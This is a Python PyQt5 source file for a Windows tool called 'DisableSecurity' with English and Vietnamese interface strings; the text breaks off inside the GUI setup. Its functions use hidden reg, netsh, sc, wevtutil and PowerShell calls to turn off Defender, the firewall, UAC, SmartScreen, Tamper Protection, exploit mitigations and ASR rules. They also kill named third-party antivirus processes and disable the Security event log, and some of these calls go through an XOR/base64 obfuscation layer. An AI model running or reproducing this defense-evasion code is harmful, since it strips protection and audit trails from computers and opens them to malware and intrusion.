import sys
import subprocess
import os
import logging
import datetime
import psutil
import ctypes
import base64
import winsound
from PyQt5.QtWidgets import (QApplication, QMainWindow, QMessageBox, QVBoxLayout,
                             QPushButton, QWidget, QLabel, QTextEdit, QDialog,
                             QHBoxLayout, QButtonGroup, QGridLayout, QFrame, QSplitter)
from PyQt5.QtCore import Qt, QSize, QTimer, QRunnable, QThreadPool, pyqtSignal, QObject
from PyQt5.QtGui import QFont, QIcon, QPixmap, QColor
import qdarkstyle

# --- Constants and Configuration ---
BACKUP_DIR = "backup"
LOG_FILE = "system_tool.log"
ICON_FILE = "icon.ico"
VERSION = "1.5"  # Increased version number
AUTHOR = "Namtran5905"
DESCRIPTION = "A tool to disable various Windows security features. Use with extreme caution!"

# --- Obfuscation Helpers ---
def xor_cipher(text, key):
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))

def encode_string(text, key="mysecretkey"):
    xor_encoded = xor_cipher(text, key)
    b64_encoded = base64.b64encode(xor_encoded.encode()).decode()
    return b64_encoded

def decode_string(encoded_text, key="mysecretkey"):
    b64_decoded = base64.b64decode(encoded_text.encode()).decode()
    return xor_cipher(b64_decoded, key)

# --- Registry Keys (Encoded) ---
ENCODED_REGISTRY_KEYS = [
    encode_string("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"),
    encode_string("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"),
    encode_string("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
    encode_string("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate"),
    encode_string("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments"),
    encode_string("HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features"),
    encode_string("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager"),
    encode_string("HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\kernel"),
    encode_string("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access"),
    encode_string("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Network Protection"),
    encode_string("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System")
]

# --- Translations ---
translations = {
    "en": {
        "window_title": "DisableSecurity",
        "title": "Disable Security Features",
        "backup_registry": "Backup Registry",
        "restore_registry": "Restore Registry",
        "disable_windows_security": "Disable Windows Security",
        "disable_antivirus": "Disable Antivirus (Experiment)",
        "prevent_service_restarts": "Prevent Service Restarts",
        "disable_windows_features": "Disable Windows Features",
        "disable_all": "Disable All",
        "exit": "Exit",
        "backup_success": "Registry backed up successfully to: {}",
        "backup_error": "Error backing up registry: {}",
        "restore_success": "Registry restored successfully.",
        "restore_error": "Error restoring registry.",
        "restore_failed": "Registry restoration failed: {}",
        "no_backup": "No registry backup found.",
        "disable_security_success": "Windows Security and Defender disabled.",
        "disable_security_error": "Error disabling Windows Security.",
        "disable_antivirus_info": "Attempted to disable third-party antivirus.",
        "disable_antivirus_success": "Third-party antivirus disabled successfully.",
        "disable_antivirus_error": "Error disabling third-party antivirus.",
        "prevent_services_info": "Attempted to prevent security service restarts.",
        "disable_features_success": "Other Windows security features disabled.",
        "disable_features_error": "Error disabling Windows features.",
        "disable_all_confirm": "Are you sure you want to disable ALL security features?\nThis is highly risky and should only be done in a controlled environment.",
        "disable_all_success": "All security features disabled.",
        "disable_all_error": "Error disabling all security features. See log for details.",
        "admin_error": "This script must be run as an administrator.",
        "about_title": "About",
        "about_text": f"Author: {AUTHOR}\nVersion: {VERSION}\n\n{DESCRIPTION}\n\nUse this tool responsibly and only in controlled environments.",
        "language": "Language",
        "disable_event_log_info": "Attempted to disable Windows Event Logging. This is a drastic measure!",
        "disable_event_log_error": "Error disabling Windows Event Logging.",
        "disable_tamper_protection_info": "Attempting to disable Tamper Protection.  This may require a reboot.",
        "disable_tamper_protection_error": "Error disabling Tamper Protection.",
        "status_active": "Active",
        "status_inactive": "Inactive",
        "status_unknown": "Unknown",
        "feature_defender": "Windows Defender",
        "feature_firewall": "Windows Firewall",
        "feature_uac": "User Account Control (UAC)",
        "feature_smartscreen": "SmartScreen",
        "feature_dep": "Data Execution Prevention (DEP)",
        "feature_cfg": "Control Flow Guard (CFG)",
        "feature_cfa": "Controlled Folder Access",
        "feature_np": "Network Protection",
        "feature_asr": "Attack Surface Reduction (ASR)",
        "feature_tamper": "Tamper Protection",
        "feature_eventlog": "Event Logging",
        "refresh_status": "Refresh Status",
        "refresh_complete": "Status refreshed!",

    },
    "vi": {
        "window_title": "DisableSecurity",
        "title": "Vô Hiệu Hóa Tính Năng Bảo Mật",
        "backup_registry": "Sao Lưu Registry",
        "restore_registry": "Khôi Phục Registry",
        "disable_windows_security": "Vô Hiệu Hóa Windows Security",
        "disable_antivirus": "Vô Hiệu Hóa Antivirus (Experiment)",
        "prevent_service_restarts": "Ngăn Dịch Vụ Khởi Động Lại",
        "disable_windows_features": "Vô Hiệu Hóa Tính Năng Windows",
        "disable_all": "Vô Hiệu Hóa Tất Cả",
        "exit": "Thoát",
        "backup_success": "Đã sao lưu registry thành công vào: {}",
        "backup_error": "Lỗi khi sao lưu registry: {}",
        "restore_success": "Đã khôi phục registry thành công.",
        "restore_error": "Lỗi khi khôi phục registry.",
        "restore_failed": "Khôi phục registry thất bại: {}",
        "no_backup": "Không tìm thấy bản sao lưu registry.",
        "disable_security_success": "Đã vô hiệu hóa Windows Security và Defender.",
        "disable_security_error": "Lỗi khi vô hiệu hóa Windows Security.",
        "disable_antivirus_info": "Đã cố gắng vô hiệu hóa phần mềm diệt virus của bên thứ ba.",
        "disable_antivirus_success": "Đã vô hiệu hóa phần mềm diệt virus của bên thứ ba.",
        "disable_antivirus_error": "Lỗi vô hiệu hóa phần mềm diệt virus của bên thứ ba.",
        "prevent_services_info": "Đã cố gắng ngăn các dịch vụ bảo mật khởi động lại.",
        "disable_features_success": "Đã vô hiệu hóa các tính năng bảo mật Windows khác.",
        "disable_features_error": "Lỗi khi vô hiệu hóa các tính năng Windows.",
        "disable_all_confirm": "Bạn có chắc chắn muốn vô hiệu hóa TẤT CẢ các tính năng bảo mật không?\nHành động này rất rủi ro và chỉ nên thực hiện trong môi trường được kiểm soát.",
        "disable_all_success": "Đã vô hiệu hóa tất cả các tính năng bảo mật.",
        "disable_all_error": "Lỗi khi vô hiệu hóa tất cả các tính năng bảo mật. Xem nhật ký để biết chi tiết.",
        "admin_error": "Chương trình này phải được chạy với quyền quản trị viên.",
        "about_title": "Thông tin",
        "about_text": f"Tác giả: {AUTHOR}\nPhiên bản: {VERSION}\n\n{DESCRIPTION}\n\nHãy sử dụng công cụ này một cách có trách nhiệm và chỉ trong môi trường được kiểm soát.",
        "language": "Ngôn ngữ",
        "disable_event_log_info": "Đã cố gắng vô hiệu hóa Ghi nhật ký sự kiện Windows. Đây là một biện pháp mạnh!",
        "disable_event_log_error": "Lỗi khi vô hiệu hóa Ghi nhật ký sự kiện Windows.",
        "disable_tamper_protection_info": "Đang cố gắng vô hiệu hóa Tamper Protection.  Điều này có thể yêu cầu khởi động lại.",
        "disable_tamper_protection_error": "Lỗi khi vô hiệu hóa Tamper Protection.",
        "status_active": "Đang hoạt động",
        "status_inactive": "Không hoạt động",
        "status_unknown": "Không rõ",
        "feature_defender": "Windows Defender",
        "feature_firewall": "Tường lửa Windows",
        "feature_uac": "Kiểm soát Tài khoản Người dùng (UAC)",
        "feature_smartscreen": "SmartScreen",
        "feature_dep": "Ngăn chặn Thực thi Dữ liệu (DEP)",
        "feature_cfg": "Bảo vệ Luồng Điều khiển (CFG)",
        "feature_cfa": "Truy cập Thư mục Được Kiểm soát",
        "feature_np": "Bảo vệ Mạng",
        "feature_asr": "Giảm bề mặt tấn công (ASR)",
        "feature_tamper": "Chống giả mạo",
        "feature_eventlog": "Ghi nhật ký sự kiện",
        "refresh_status": "Làm mới trạng thái",
        "refresh_complete": "Đã làm mới trạng thái!",
    }
}

# --- Multithreading Helpers ---

class WorkerSignals(QObject):
    finished = pyqtSignal()
    error = pyqtSignal(str)
    result = pyqtSignal(object)

class Worker(QRunnable):
    def __init__(self, fn, *args, **kwargs):
        super(Worker, self).__init__()
        self.fn = fn
        self.args = args
        self.kwargs = kwargs
        self.signals = WorkerSignals()

    def run(self):
        try:
            result = self.fn(*self.args, **self.kwargs)
            if result is not None:
                self.signals.result.emit(result)
        except Exception as e:
            self.signals.error.emit(str(e))
        finally:
            self.signals.finished.emit()

def run_in_thread(fn):
    def wrapper(*args, **kwargs):
        worker = Worker(fn, *args, **kwargs)
        QThreadPool.globalInstance().start(worker)
        return worker
    return wrapper

# --- Helper Functions ---

def setup_logging():
    logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def create_backup_dir():
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)

def reg_key_exists(key):
    """Checks if a registry key exists."""
    try:
        subprocess.run(["reg", "query", key], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except subprocess.CalledProcessError:
        return False

@run_in_thread
def backup_registry(self):
    """Backs up the entire HKLM\\SOFTWARE registry hive."""
    create_backup_dir()
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_file_latest = os.path.join(BACKUP_DIR, "registry_backup_latest.reg")
    backup_file_timestamped = os.path.join(BACKUP_DIR, f"registry_backup_{timestamp}.reg")

    try:
        # Backup to both latest and timestamped files
        subprocess.run(["reg", "export", "HKLM\\SOFTWARE", backup_file_latest, "/y"], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(["reg", "export", "HKLM\\SOFTWARE", backup_file_timestamped, "/y"], check=True, creationflags=subprocess.CREATE_NO_WINDOW)

        logging.info(f"Registry backed up to {backup_file_latest} and {backup_file_timestamped}")
        return True, backup_file_latest  # Return success and the latest backup file path
    except subprocess.CalledProcessError as e:
        logging.error(f"Error backing up registry: {e}")
        self.signals.error.emit(str(e)) # Signal the error
        return False, str(e)


@run_in_thread
@run_in_thread
def restore_registry(self, backup_file):
    """Restores the entire HKLM\\SOFTWARE registry hive from a backup file."""
    try:
        subprocess.run(["reg", "import", backup_file], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        logging.info(f"Registry restored from {backup_file}")
        return True  # Signal success
    except subprocess.CalledProcessError as e:
        logging.error(f"Error restoring registry: {e}")
        self.signals.error.emit(str(e)) # Signal errors
        return False
    except FileNotFoundError:
        logging.error(f"Backup file not found: {backup_file}")
        self.signals.error.emit(f"Backup file not found: {backup_file}") # Signal error
        return False

# --- Security Disabling Functions (Obfuscated and Enhanced) ---
@run_in_thread
def disable_windows_security_obfuscated(self):
    try:
        subprocess.run([decode_string(encode_string("reg")), decode_string(encode_string("add")), decode_string(ENCODED_REGISTRY_KEYS[0]), decode_string(encode_string("/v")), decode_string(encode_string("DisableAntiSpyware")), decode_string(encode_string("/t")), decode_string(encode_string("REG_DWORD")), decode_string(encode_string("/d")), decode_string(encode_string("1")), decode_string(encode_string("/f"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run([decode_string(encode_string("reg")), decode_string(encode_string("add")), decode_string(ENCODED_REGISTRY_KEYS[0]), decode_string(encode_string("/v")), decode_string(encode_string("DisableAntiVirus")), decode_string(encode_string("/t")), decode_string(encode_string("REG_DWORD")), decode_string(encode_string("/d")), decode_string(encode_string("1")), decode_string(encode_string("/f"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run([decode_string(encode_string("reg")), decode_string(encode_string("add")), decode_string(ENCODED_REGISTRY_KEYS[1]), decode_string(encode_string("/v")), decode_string(encode_string("DisableIOAVProtection")), decode_string(encode_string("/t")), decode_string(encode_string("REG_DWORD")), decode_string(encode_string("/d")), decode_string(encode_string("1")), decode_string(encode_string("/f"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run([decode_string(encode_string("netsh")), decode_string(encode_string("advfirewall")), decode_string(encode_string("set")), decode_string(encode_string("allprofiles")), decode_string(encode_string("state")), decode_string(encode_string("off"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        logging.info("Windows Security and Defender disabled (obfuscated).")
        return True
    except subprocess.CalledProcessError as e:
        logging.error(f"Error disabling Windows Security: {e}")
        self.signals.error.emit(str(e))
        return False

@run_in_thread
def disable_third_party_antivirus_obfuscated(self, main_window):
    """Attempts to disable common third-party antivirus, with improved robustness."""
    antivirus_software = [
        ("kaspersky", ["kavsvc.exe", "avp.exe"], ["KAVFS", "klif"]),  # Process names, Service names
        ("eset", ["egui.exe", "ekrn.exe"], ["ekrn"]),
        ("avast", ["AvastUI.exe", "AvastSvc.exe"], ["AvastAntivirus"]),
        ("avg", ["AVGUI.exe", "avgsvc.exe"], ["AVG Antivirus"]),
        ("bitdefender", ["bdagent.exe", "vsserv.exe"], ["bdredline", "vsserv"]),
        ("mcafee", ["mcshield.exe", "mfefire.exe"], ["McAfeeFramework", "McAfeeEngineService"]),
        ("norton", ["NortonSecurity.exe", "NS.exe"], ["NortonSecurity", "NortonInternetSecurity"]), # Added Norton
        ("norton 360", ["Norton360.exe"], ["Norton360"]) # Added Norton 360
    ]
    success = True # Keep track of the disable action.
    for name, processes, services in antivirus_software:
        try:
            # Kill processes
            for proc_name in processes:
                for proc in psutil.process_iter(['name']):
                    try:
                        if proc_name.lower() in proc.info['name'].lower():
                            proc.kill()
                            logging.info(f"Killed process {proc.info['name']} (part of {name})")
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass  # Ignore if process already gone, or can't access

            # Disable services
            for svc_name in services:
                try:
                    subprocess.run(["sc", "config", svc_name, "start=disabled"], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    logging.info(f"Disabled service {svc_name} (part of {name})")
                except subprocess.CalledProcessError as e:
                    logging.error(f"Error disabling service {svc_name} (part of {name}): {e}")
                    #Don't raise the error, because we are running with multi thread.
                    # self.signals.error.emit(str(e)) #Error handled, but don't stop
                    success = False # If we got error when disabling, set return value to false.

        except Exception as e:
            logging.error(f"Unexpected error handling {name}: {e}")
            main_window.log_message(f"Unexpected error handling {name}: {e}", logging.ERROR) # Use the passed in main_window
            # self.signals.error.emit(str(e)) #Error handled, but don't stop.
            success = False # If we got error when disabling, set return value to false.
    return success


@run_in_thread
def prevent_security_service_restarts_obfuscated(self):
    security_services = [encode_string("windefend"), encode_string("securityhealthservice"), encode_string("wscsvc"), encode_string("mpssvc")]
    for encoded_service in security_services:
        service = decode_string(encoded_service)
        try:
            subprocess.run([decode_string(encode_string("sc")), decode_string(encode_string("config")), service, decode_string(encode_string("start=disabled"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            logging.info(f"Disabled service {service}.")
        except subprocess.CalledProcessError as e:
            logging.error(f"Error disabling service {service}: {e}")
            self.signals.error.emit(str(e))

@run_in_thread
def disable_windows_features_obfuscated(self):
    try:
        subprocess.run([decode_string(encode_string("reg")), decode_string(encode_string("add")), decode_string(ENCODED_REGISTRY_KEYS[2]), decode_string(encode_string("/v")), decode_string(encode_string("EnableLUA")), decode_string(encode_string("/t")), decode_string(encode_string("REG_DWORD")), decode_string(encode_string("/d")), decode_string(encode_string("0")), decode_string(encode_string("/f"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run([decode_string(encode_string("reg")), decode_string(encode_string("add")), decode_string(ENCODED_REGISTRY_KEYS[3]), decode_string(encode_string("/v")), decode_string(encode_string("DisableWindowsUpdateAccess")), decode_string(encode_string("/t")), decode_string(encode_string("REG_DWORD")), decode_string(encode_string("/d")), decode_string(encode_string("1")), decode_string(encode_string("/f"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run([decode_string(encode_string("reg")), decode_string(encode_string("add")), decode_string(ENCODED_REGISTRY_KEYS[4]), decode_string(encode_string("/v")), decode_string(encode_string("SaveZoneInformation")), decode_string(encode_string("/t")), decode_string(encode_string("REG_DWORD")), decode_string(encode_string("/d")), decode_string(encode_string("1")), decode_string(encode_string("/f"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run([decode_string(encode_string("reg")), decode_string(encode_string("add")), decode_string(ENCODED_REGISTRY_KEYS[10]), decode_string(encode_string("/v")), decode_string(encode_string("EnableSmartScreen")), decode_string(encode_string("/t")), decode_string(encode_string("REG_DWORD")), decode_string(encode_string("/d")), decode_string(encode_string("0")), decode_string(encode_string("/f"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run([decode_string(encode_string("reg")), decode_string(encode_string("add")), decode_string(ENCODED_REGISTRY_KEYS[6]), decode_string(encode_string("/v")), decode_string(encode_string("EnableExecuteOnly")), decode_string(encode_string("/t")), decode_string(encode_string("REG_DWORD")), decode_string(encode_string("/d")), decode_string(encode_string("0")), decode_string(encode_string("/f"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run([decode_string(encode_string("reg")), decode_string(encode_string("add")), decode_string(ENCODED_REGISTRY_KEYS[7]), decode_string(encode_string("/v")), decode_string(encode_string("MitigationOptions")), decode_string(encode_string("/t")), decode_string(encode_string("REG_BINARY")), decode_string(encode_string("/d")), decode_string(encode_string("00000000000000000000000000000000")), decode_string(encode_string("/f"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run([decode_string(encode_string("reg")), decode_string(encode_string("add")), decode_string(ENCODED_REGISTRY_KEYS[8]), decode_string(encode_string("/v")), decode_string(encode_string("EnableControlledFolderAccess")), decode_string(encode_string("/t")), decode_string(encode_string("REG_DWORD")), decode_string(encode_string("/d")), decode_string(encode_string("0")), decode_string(encode_string("/f"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run([decode_string(encode_string("reg")), decode_string(encode_string("add")), decode_string(ENCODED_REGISTRY_KEYS[9]), decode_string(encode_string("/v")), decode_string(encode_string("EnableNetworkProtection")), decode_string(encode_string("/t")), decode_string(encode_string("REG_DWORD")), decode_string(encode_string("/d")), decode_string(encode_string("0")), decode_string(encode_string("/f"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        logging.info("Disabled other Windows security features (obfuscated).")
        return True
    except subprocess.CalledProcessError as e:
        logging.error(f"Error disabling Windows features: {e}")
        self.signals.error.emit(str(e))
        return False
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        self.signals.error.emit(str(e))
        return False

@run_in_thread
def disable_event_logging(self):
    try:
        subprocess.run(["wevtutil", "set-log", "Microsoft-Windows-Windows Defender/Operational", "/enabled:false"], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(["wevtutil", "set-log", "Security", "/enabled:false"], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        logging.info("Attempted to disable Windows Event Logging.")
        return True
    except subprocess.CalledProcessError as e:
        logging.error(f"Error disabling event logging: {e}")
        self.signals.error.emit(str(e))
        return False

@run_in_thread
def disable_tamper_protection(self):
    try:
        subprocess.run([decode_string(encode_string("reg")), decode_string(encode_string("add")), decode_string(ENCODED_REGISTRY_KEYS[5]), decode_string(encode_string("/v")), decode_string(encode_string("TamperProtection")), decode_string(encode_string("/t")), decode_string(encode_string("REG_DWORD")), decode_string(encode_string("/d")), decode_string(encode_string("0")), decode_string(encode_string("/f"))], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        logging.info("Attempted to disable Tamper Protection.")
        return True
    except subprocess.CalledProcessError as e:
        logging.error(f"Error disabling Tamper Protection: {e}")
        self.signals.error.emit(str(e))
        return False

@run_in_thread
def disable_asr_rules(self):
    try:
        rules = {
            "92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b": "0",
            "d4f940ab-401b-4efc-aadc-ad5f3c50688a": "0",
            "5beb7efe-fd9a-4556-801d-275e5ffc04cc": "0",
        }
        for rule_id, value in rules.items():
            command = f'Set-MpPreference -AttackSurfaceReductionRules_Ids {rule_id} -AttackSurfaceReductionRules_Actions {value}'
            process = subprocess.Popen(["powershell", "-Command", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
            stdout, stderr = process.communicate()
            if process.returncode != 0:
                logging.error(f"Error disabling ASR rule {rule_id}: {stderr.decode()}")
                self.signals.error.emit(f"Error disabling ASR rule {rule_id}: {stderr.decode()}")
            else:
                logging.info(f"Disabled ASR rule {rule_id}")
        return True
    except Exception as e:
        logging.error(f"Error disabling ASR rules: {e}")
        self.signals.error.emit(str(e))
        return False

# --- Status Checking Functions ---

def get_defender_status():
    try:
        result = subprocess.run(
            ["powershell", "Get-MpComputerStatus | Select-Object -ExpandProperty AMServiceEnabled"],
            capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        return translations[MainWindow.current_language]["status_inactive"] if result.stdout.strip() == 'False' else translations[MainWindow.current_language]["status_active"]
    except Exception:
        return translations[MainWindow.current_language]["status_unknown"]

def get_firewall_status():
    try:
        result = subprocess.run(
            ["netsh", "advfirewall", "show", "allprofiles"],
            capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        if "State                            OFF" in result.stdout:
             return translations[MainWindow.current_language]["status_inactive"]
        else:
            return translations[MainWindow.current_language]["status_active"]

    except Exception:
        return translations[MainWindow.current_language]["status_unknown"]

def get_uac_status():
    try:
        result = subprocess.run(
            ["reg", "query", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "EnableLUA"],
            capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        if "0x1" in result.stdout:
            return translations[MainWindow.current_language]["status_active"]
        elif "0x0" in result.stdout:
            return translations[MainWindow.current_language]["status_inactive"]
        else:
            return translations[MainWindow.current_language]["status_unknown"]
    except Exception:
        return translations[MainWindow.current_language]["status_unknown"]

def get_smartscreen_status():
    try:
        result = subprocess.run(
            ["reg", "query", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "/v", "EnableSmartScreen"],
            capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        if "0x1" in result.stdout:
            return translations[MainWindow.current_language]["status_active"]
        elif "0x0" in result.stdout:
            return translations[MainWindow.current_language]["status_inactive"]
        else:
            return translations[MainWindow.current_language]["status_unknown"]

    except Exception:
         return translations[MainWindow.current_language]["status_unknown"]

def get_dep_status():
    try:
        result = subprocess.run(
            ["reg", "query", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "/v", "EnableExecuteOnly"],
            capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        if "0x1" in result.stdout:
            return translations[MainWindow.current_language]["status_active"]
        elif "0x0" in result.stdout:
            return translations[MainWindow.current_language]["status_inactive"]
        else:
            return translations[MainWindow.current_language]["status_unknown"]

    except Exception:
         return translations[MainWindow.current_language]["status_unknown"]

def get_cfg_status():
    try:
      result = subprocess.run(
          ["reg", "query", "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\kernel", "/v", "MitigationOptions"],
          capture_output=True, text=True, check=True, creationflags = subprocess.CREATE_NO_WINDOW
      )
      if "0x2" in result.stdout or "0x1" in result.stdout :
        return translations[MainWindow.current_language]["status_active"]
      else:
        return translations[MainWindow.current_language]["status_inactive"]

    except Exception as ex:
      return translations[MainWindow.current_language]["status_unknown"]


def get_cfa_status():
    try:
        result = subprocess.run(
            ["reg", "query", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access", "/v", "EnableControlledFolderAccess"],
            capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        if "0x1" in result.stdout:
            return translations[MainWindow.current_language]["status_active"]
        elif "0x0" in result.stdout:
            return translations[MainWindow.current_language]["status_inactive"]
        else:
            return translations[MainWindow.current_language]["status_unknown"]

    except Exception:
        return translations[MainWindow.current_language]["status_unknown"]

def get_network_protection_status():
    try:
        result = subprocess.run(
            ["reg", "query", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Network Protection", "/v", "EnableNetworkProtection"],
            capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        if "0x1" in result.stdout:
            return translations[MainWindow.current_language]["status_active"]
        elif "0x0" in result.stdout:
            return translations[MainWindow.current_language]["status_inactive"]
        else:
            return translations[MainWindow.current_language]["status_unknown"]
    except Exception:
        return translations[MainWindow.current_language]["status_unknown"]

def get_asr_status():
  try:
    result = subprocess.run(
        ["powershell", "Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids"],
        capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

    if result.stdout.strip():
      return translations[MainWindow.current_language]["status_active"]
    else:
      return translations[MainWindow.current_language]["status_inactive"]

  except Exception:
    return translations[MainWindow.current_language]["status_unknown"]

def get_tamper_protection_status():
    try:
        result = subprocess.run(
            ["reg", "query", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features", "/v", "TamperProtection"],
            capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        if "0x5" in result.stdout:
            return translations[MainWindow.current_language]["status_active"]
        elif "0x0" in result.stdout or "0x4" in result.stdout :
            return translations[MainWindow.current_language]["status_inactive"]
        else:
            return translations[MainWindow.current_language]["status_unknown"]
    except Exception:
        return translations[MainWindow.current_language]["status_unknown"]

def get_event_logging_status():
    try:
        result = subprocess.run(
            ["wevtutil", "qe", "Security", "/c:1", "/rd:true", "/f:text"],
            capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        if "Event ID" in result.stdout:
            return translations[MainWindow.current_language]["status_active"]
        else:
            return translations[MainWindow.current_language]["status_inactive"]
    except Exception:
        return translations[MainWindow.current_language]["status_unknown"]


# --- GUI and Application Logic ---

class CustomMessageBox(QDialog):
    def __init__(self, title, message, icon, parent=None):
        super().__init__(parent)
        self.setWindowTitle(title)
        self.current_language = parent.current_language if parent else "vi" # Use parent language
        if os.path.exists(ICON_FILE):
            self.setWindowIcon(QIcon(ICON_FILE))
        else:
            self.setWindowIcon(QIcon.fromTheme("dialog-warning"))
        self.setGeometry(100, 100, 230, 150)
        layout = QVBoxLayout()
        self.label = QLabel(message)
        self.label.setWordWrap(True)
        self.label.setFont(QFont("Segoe UI", 10))
        layout.addWidget(self.label)
        button_layout = QHBoxLayout()
        self.ok_button = QPushButton(translations[self.current_language]["exit"])  # Translate button text
        self.ok_button.clicked.connect(self.accept)
        button_layout.addWidget(self.ok_button)
        layout.addLayout(button_layout)
        self.setLayout(layout)


class AboutDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle(translations[parent.current_language]["about_title"])
        self.setWindowIcon(QIcon(ICON_FILE) if os.path.exists(ICON_FILE) else QIcon.fromTheme("dialog-information"))
        self.setGeometry(200, 200, 400, 250)
        layout = QVBoxLayout()
        if os.path.exists(ICON_FILE):
            icon_label = QLabel()
            pixmap = QPixmap(ICON_FILE)
            icon_label.setPixmap(pixmap.scaled(64, 64, Qt.KeepAspectRatio, Qt.SmoothTransformation))
            icon_label.setAlignment(Qt.AlignCenter)
            layout.addWidget(icon_label)
        text_label = QLabel(translations[parent.current_language]["about_text"])
        text_label.setWordWrap(True)
        text_label.setAlignment(Qt.AlignCenter)
        text_label.setFont(QFont("Segoe UI", 10))
        layout.addWidget(text_label)
        ok_button = QPushButton("OK")
        ok_button.setFont(QFont("Segoe UI", 10))
        ok_button.clicked.connect(self.accept)
        layout.addWidget(ok_button)
        self.setLayout(layout)

class MainWindow(QMainWindow):
    current_language = "vi"  # Class-level variable for language
    def __init__(self):
        super().__init__()
        MainWindow.current_language = "vi"
        self.setWindowTitle(translations[self.current_language]["window_title"])
        if os.path.exists(ICON_FILE):  self.setWindowIcon(QIcon(ICON_FILE))
        else:  self.setWindowIcon(QIcon.fromTheme("security-high"))
        self.setGeometry(300, 700, 900, 830)
        self.setup_ui()
        self.update_status_labels()


    def setup_ui(self):
        main_layout = QHBoxLayout()

        left_widget = QWidget()
        left_layout = QVBoxLayout()
        left_layout.setContentsMargins(10, 10, 10, 10)
        left_layout.setSpacing(5)

        buttons = [
            ("backup_registry", self.backup_registry, "backup_registry"),
            ("restore_registry", self.restore_registry, "restore_registry"),
            ("disable_windows_security", self.call_disable_windows_security, "disable_windows_security"),
            ("disable_antivirus", self.call_disable_antivirus, "disable_antivirus"),
            ("prevent_service_restarts", self.call_prevent_services, "prevent_service_restarts"),
            ("disable_windows_features", self.call_disable_windows_features, "disable_windows_features"),
            ("disable_all", self.call_disable_all, "disable_all"),
            ("exit", self.close, "exit"),
        ]
        self.buttons = {}
        for text_key, callback, tooltip_key in buttons:
            button = QPushButton(translations[self.current_language][text_key])
            button.setFont(QFont("Segoe UI", 10))
            button.setToolTip(translations[self.current_language][tooltip_key])
            button.clicked.connect(callback)
            button.setStyleSheet("""
                QPushButton {
                    padding: 8px 16px;
                    border-radius: 8px;
                    background-color: #444;
                    color: #eee;
                    border: 1px solid #666;
                }
                QPushButton:hover {
                    background-color: #555;
                    border: 1px solid #777;
                }
                QPushButton:pressed {
                    background-color: #666;
                    border: 1px solid #888;
                }
            """)
            left_layout.addWidget(button)
            self.buttons[text_key] = button

